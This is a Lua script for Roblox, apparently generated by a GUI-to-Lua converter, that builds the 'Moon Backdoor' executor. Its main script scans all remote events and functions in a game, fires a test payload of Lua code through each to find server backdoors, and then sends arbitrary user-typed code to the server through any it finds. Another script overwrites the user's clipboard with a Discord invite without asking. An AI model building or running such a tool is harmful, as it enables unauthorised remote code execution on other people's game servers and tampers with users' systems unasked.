--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
]=]

-- Instances: 18 | Scripts: 3 | Modules: 0 | Tags: 0
local G2L = {};

-- StarterGui.ScreenGui
G2L["1"] = Instance.new("ScreenGui", game:GetService("CoreGui"):WaitForChild("af21f37e484439e3ba6f6ef33f54be0186fb6c713fad82bed075489009bd6854"));
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;


-- StarterGui.ScreenGui.Main
G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["BorderSizePixel"] = 0;
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(92, 7, 123);
G2L["2"]["Size"] = UDim2.new(0, 472, 0, 312);
G2L["2"]["Position"] = UDim2.new(0.23167, 0, 0.2484, 0);
G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2"]["Name"] = [[Main]];


-- StarterGui.ScreenGui.Main.LocalScript
G2L["3"] = Instance.new("LocalScript", G2L["2"]);



-- StarterGui.ScreenGui.Main.UIDrag
G2L["4"] = Instance.new("LocalScript", G2L["2"]);
G2L["4"]["Name"] = [[UIDrag]];


-- StarterGui.ScreenGui.Main.LocalScript
G2L["5"] = Instance.new("LocalScript", G2L["2"]);



-- StarterGui.ScreenGui.Main.bg
G2L["6"] = Instance.new("ImageLabel", G2L["2"]);
G2L["6"]["BorderSizePixel"] = 0;
G2L["6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6"]["ImageTransparency"] = 0.4;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["6"]["ImageColor3"] = Color3.fromRGB(129, 0, 255);
G2L["6"]["Image"] = [[rbxassetid://992001116]];
G2L["6"]["Size"] = UDim2.new(0, 471, 0, 312);
G2L["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6"]["BackgroundTransparency"] = 1;
G2L["6"]["Name"] = [[bg]];


-- StarterGui.ScreenGui.Main.CodeBar
G2L["7"] = Instance.new("TextBox", G2L["2"]);
G2L["7"]["Name"] = [[CodeBar]];
G2L["7"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["7"]["BorderSizePixel"] = 0;
G2L["7"]["TextWrapped"] = true;
G2L["7"]["TextSize"] = 17;
G2L["7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["7"]["BackgroundColor3"] = Color3.fromRGB(3, 3, 3);
G2L["7"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["7"]["MultiLine"] = true;
G2L["7"]["ClearTextOnFocus"] = false;
G2L["7"]["PlaceholderText"] = [[print(" Moon Backdoor")]];
G2L["7"]["Size"] = UDim2.new(0, 431, 0, 202);
G2L["7"]["Position"] = UDim2.new(0.04237, 0, 0.14423, 0);
G2L["7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7"]["Text"] = [[]];


-- StarterGui.ScreenGui.Main.Buttons
G2L["8"] = Instance.new("Frame", G2L["2"]);
G2L["8"]["BorderSizePixel"] = 0;
G2L["8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8"]["Size"] = UDim2.new(0, 431, 0, 41);
G2L["8"]["Position"] = UDim2.new(0.04237, 0, 0.82051, 0);
G2L["8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8"]["Name"] = [[Buttons]];
G2L["8"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Main.Buttons.UIListLayout
G2L["9"] = Instance.new("UIListLayout", G2L["8"]);
G2L["9"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["9"]["Padding"] = UDim.new(0, 19);
G2L["9"]["VerticalAlignment"] = Enum.VerticalAlignment.Center;
G2L["9"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["9"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.ScreenGui.Main.Buttons.Exe
G2L["a"] = Instance.new("TextButton", G2L["8"]);
G2L["a"]["BorderSizePixel"] = 0;
G2L["a"]["TextSize"] = 29;
G2L["a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a"]["BackgroundColor3"] = Color3.fromRGB(69, 3, 113);
G2L["a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a"]["Size"] = UDim2.new(0, 205, 0, 38);
G2L["a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a"]["Text"] = [[Execute]];
G2L["a"]["Name"] = [[Exe]];
G2L["a"]["Position"] = UDim2.new(0.2181, 0, -0.0122, 0);


-- StarterGui.ScreenGui.Main.Buttons.Clear
G2L["b"] = Instance.new("TextButton", G2L["8"]);
G2L["b"]["BorderSizePixel"] = 0;
G2L["b"]["TextSize"] = 29;
G2L["b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b"]["BackgroundColor3"] = Color3.fromRGB(69, 3, 113);
G2L["b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["b"]["Size"] = UDim2.new(0, 205, 0, 38);
G2L["b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b"]["Text"] = [[clear]];
G2L["b"]["Name"] = [[Clear]];
G2L["b"]["Position"] = UDim2.new(0.2181, 0, -0.0122, 0);


-- StarterGui.ScreenGui.Main.Name
G2L["c"] = Instance.new("TextLabel", G2L["2"]);
G2L["c"]["BorderSizePixel"] = 0;
G2L["c"]["TextSize"] = 36;
G2L["c"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c"]["BackgroundTransparency"] = 1;
G2L["c"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c"]["Text"] = [[Moon Backdoor]];
G2L["c"]["Name"] = [[Name]];
G2L["c"]["Position"] = UDim2.new(0.13347, 0, 0, 0);


-- StarterGui.ScreenGui.Main.Logo
G2L["d"] = Instance.new("ImageLabel", G2L["2"]);
G2L["d"]["BorderSizePixel"] = 0;
G2L["d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["d"]["Image"] = [[rbxassetid://73958241564252]];
G2L["d"]["Size"] = UDim2.new(0, 33, 0, 38);
G2L["d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d"]["BackgroundTransparency"] = 1;
G2L["d"]["Name"] = [[Logo]];
G2L["d"]["Position"] = UDim2.new(0.04237, 0, 0.02564, 0);


-- StarterGui.ScreenGui.Main.Logo.UIAspectRatioConstraint
G2L["e"] = Instance.new("UIAspectRatioConstraint", G2L["d"]);



-- StarterGui.ScreenGui.Main.Stats
G2L["f"] = Instance.new("TextLabel", G2L["2"]);
G2L["f"]["BorderSizePixel"] = 0;
G2L["f"]["TextSize"] = 20;
G2L["f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f"]["BackgroundTransparency"] = 1;
G2L["f"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f"]["Text"] = [[🔴]];
G2L["f"]["Name"] = [[Stats]];
G2L["f"]["Position"] = UDim2.new(0.89407, 0, 0, 0);


-- StarterGui.ScreenGui.Main.Stats.UIAspectRatioConstraint
G2L["10"] = Instance.new("UIAspectRatioConstraint", G2L["f"]);



-- StarterGui.ScreenGui.Main.Connect
G2L["11"] = Instance.new("TextButton", G2L["2"]);
G2L["11"]["BorderSizePixel"] = 0;
G2L["11"]["TextSize"] = 20;
G2L["11"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["11"]["BackgroundColor3"] = Color3.fromRGB(69, 3, 113);
G2L["11"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["11"]["Size"] = UDim2.new(0, 98, 0.01, 22);
G2L["11"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11"]["Text"] = [[Connect]];
G2L["11"]["Name"] = [[Connect]];
G2L["11"]["Position"] = UDim2.new(0.68522, 0, 0.0387, 0);


-- StarterGui.ScreenGui.Main.Contains
G2L["12"] = Instance.new("TextLabel", G2L["2"]);
G2L["12"]["BorderSizePixel"] = 0;
G2L["12"]["TextSize"] = 36;
G2L["12"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["12"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["12"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["12"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["12"]["BackgroundTransparency"] = 1;
G2L["12"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["12"]["Visible"] = false;
G2L["12"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12"]["Text"] = [[Moon Backdoor]];
G2L["12"]["Name"] = [[Contains]];
G2L["12"]["Position"] = UDim2.new(0.13347, 0, 0, 0);


-- StarterGui.ScreenGui.Main.LocalScript
local function C_3()
local script = G2L["3"];
	local buttons = {
		Exe = script.Parent.Buttons.Exe;
		clear = script.Parent.Buttons.Clear;
		connect = script.Parent.Connect;
	}
	
	local statustext = script.Parent.Stats
	local codeBar = script.Parent.CodeBar
	
	local statusss = {
		Offline = "🔴";
		checking = "🟠";
		allow = "🟢";
	}
	
	local function status(types)
		if types == "O" then
			statustext.Text = statusss.Offline
		elseif types == "C" then
			statustext.Text = statusss.checking
		elseif types == "B" then
			statustext.Text = statusss.allow
		end
	end
	
	local SAFE_LOCATIONS = {
		["CoreGui"] = true,
		["ServerStorage"] = true,
		["ReplicatedFirst"] = true,
		["ServerScriptService"] = true
	}
	
	local EXCLUDED_REMOTES = {
		["DefaultChatSystemChatEvents"] = true,
		["ChatSystemRunner"] = true,
		["ReplicatedStats"] = true,
		["CharacterStats"] = true,
		["PlayerList"] = true,
		["Badges"] = true,
		["Leaderboard"] = true,
		["Teams"] = true
	}
	
	local foundExploit = false
	local FinishedFound = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	
	local function isLikelyBackdoorRemote(remote)
		local name = remote.Name
		local parent = remote.Parent
		
		if SAFE_LOCATIONS[parent.ClassName] then
			return false
		end
		if string.split(remote:GetFullName(), '.')[1] == 'RobloxReplicatedStorage' then
			print('cancelled remote: '..remote:GetFullName())
			return false
		end 
		if EXCLUDED_REMOTES[name] then
			return false
		end
		
		return true
	end
	
	local function testRemote(remote, isFunction)
		if foundExploit then return false end
		local modelName = "moon_"..tostring(os.clock()):gsub("%.", "")
		local rs = game:GetService("ReplicatedStorage")
		local foundEvent = false
		
		local connection = rs.DescendantAdded:Connect(function(inst)
			if inst.Name == modelName then
				foundEvent = true
			end
		end)
		
		local function cleanup()
			connection:Disconnect()
			local f = rs:FindFirstChild(modelName)
			if f then f:Destroy() end
		end
		
		local success = pcall(function()
			local payload = [[
				local m=Instance.new("Folder")
				m.Name="]]..modelName..[["
				m.Parent=game:GetService("ReplicatedStorage")
			]]
			if isFunction then
				local invoked = pcall(function()
					remote:InvokeServer(payload)
				end)
				if not invoked then
					pcall(function()
						remote:InvokeServer('moonTSS', payload)
					end)
				end
			else
				local fired = pcall(function()
					remote:FireServer(payload)
				end)
				if not fired then
					pcall(function()
						remote:FireServer('moonTSS', payload)
					end)
				end
			end
		end)
		
		local timeout = 1
		local start = os.clock()
		while os.clock() - start < timeout do
			if foundEvent or rs:FindFirstChild(modelName) then
				foundEvent = true
				break
			end
			task.wait(0.01)
		end
		
		cleanup()
		
		if foundEvent and not foundExploit then
			foundExploit = true
			if isFunction then
				remoteFunction = remote
			else
				remoteEvent = remote
			end
			return true
		end
		
		return false
	end
	
	local ok = script.Parent.Contains
	
	local function findRemote()
		local trueStart = os.clock()
		foundExploit = false
		remoteEvent = nil
		remoteFunction = nil
		
		local remotes = {}
		for _, remote in ipairs(game:GetDescendants()) do
			if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
				table.insert(remotes, remote)
			end
		end
		
		print(string.format("🌙 moon: 🔍 scanning %d remotes", #remotes))
		
		local MAX_CONCURRENT = 64
		local activeTasks = 0
		local taskDone = Instance.new("BindableEvent")
		
		for i = 1, #remotes do
			if foundExploit then break end
			
			while activeTasks >= MAX_CONCURRENT do
				taskDone.Event:Wait()
			end
			
			activeTasks += 1
			task.spawn(function()
				local ok, result = pcall(function()
					return testRemote(remotes[i], remotes[i]:IsA("RemoteFunction"))
				end)
				
				if ok and result then
					print("🌙 moon: backdoor found:", remotes[i]:GetFullName())
				end
				
				activeTasks -= 1
				taskDone:Fire()
			end)
		end
		
		while activeTasks > 0 and not foundExploit do
			taskDone.Event:Wait()
		end
		
		scanTime = os.clock() - trueStart
		FinishedFound = true
		
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		end
		
		print(string.format("🌙 moon: scan completed in %.3f seconds", scanTime))
	end
	
	local function updateExeButton()
		if exeConnection then
			exeConnection:Disconnect()
			exeConnection = nil
		end
		
		if foundExploit then
			exeConnection = buttons.Exe.MouseButton1Click:Connect(function()
				local code = codeBar.Text
				if code and code ~= "" then
					if remoteEvent then
						print("ℹ️ Executing code through backdoor:", remoteEvent:GetFullName())
						remoteEvent:FireServer(code)
					elseif remoteFunction then
						print("ℹ️ Executing code through backdoor:", remoteFunction:GetFullName())
						pcall(function()
							remoteFunction:InvokeServer('moonTSS', code)
						end)
					end
					
					game.StarterGui:SetCore("SendNotification", {
						Title = "🌙 moon";
						Text = "Code executed through backdoor";
						Icon = "rbxassetid://73958241564252";
						Duration = 3;
					})
				else
					game.StarterGui:SetCore("SendNotification", {
						Title = "🌙 moon";
						Text = "No Code to Execute";
						Icon = "rbxassetid://73958241564252";
						Duration = 3;
					})
				end
			end)
		else
			exeConnection = buttons.Exe.MouseButton1Click:Connect(function()
				game.StarterGui:SetCore("SendNotification", {
					Title = "Moon";
					Text = "No Backdoor Found";
					Icon = "rbxassetid://73958241564252";
					Duration = 5;
				})
			end)
		end
	end
	
	buttons.connect.MouseButton1Click:Connect(function()
		status("C")
		
		game.StarterGui:SetCore("SendNotification", {
			Title = "Moon";
			Text = "Checking for backdoors...";
			Icon = "rbxassetid://73958241564252";
			Duration = 3;
		})
		
		
		task.spawn(function()
			findRemote()
			
			if foundExploit then
				status("B")
				game.StarterGui:SetCore("SendNotification", {
					Title = "🌙 moon";
					Text = "Backdoor found! Ready to execute.";
					Icon = "rbxassetid://73958241564252";
					Duration = 5;
				})
			else
				status("O")
				game.StarterGui:SetCore("SendNotification", {
					Title = "🌙 moon";
					Text = "No backdoor found";
					Icon = "rbxassetid://73958241564252";
					Duration = 5;
				})
			end
			
		
			updateExeButton()
		end)
	
		updateExeButton()
	end)
	
	buttons.clear.MouseButton1Click:Connect(function()
		codeBar.Text = ""
	end)
	
	status("O")
	updateExeButton()
end;
task.spawn(C_3);
-- StarterGui.ScreenGui.Main.UIDrag
local function C_4()
local script = G2L["4"];
	-- Made by Real_IceyDev (@lceyDex) --
	-- Simple UI dragger (PC Only/Any device that has a mouse) --
	
	local UIS = game:GetService('UserInputService')
	local frame = script.Parent
	local dragToggle = nil
	local dragSpeed = 0.25
	local dragStart = nil
	local startPos = nil
	
	local function updateInput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end
	
	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)
	
	UIS.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updateInput(input)
			end
		end
	end)
end;
task.spawn(C_4);
-- StarterGui.ScreenGui.Main.LocalScript
local function C_5()
local script = G2L["5"];
	local msg = Instance.new("Message", game.Workspace)
	msg.Text = "pls join Moon Backdoor Dc!!"
	setclipboard("https://discord.gg/W5bNxXf85r")
	wait(5)
	msg:Destroy()
end;
task.spawn(C_5);

return G2L["1"], require;
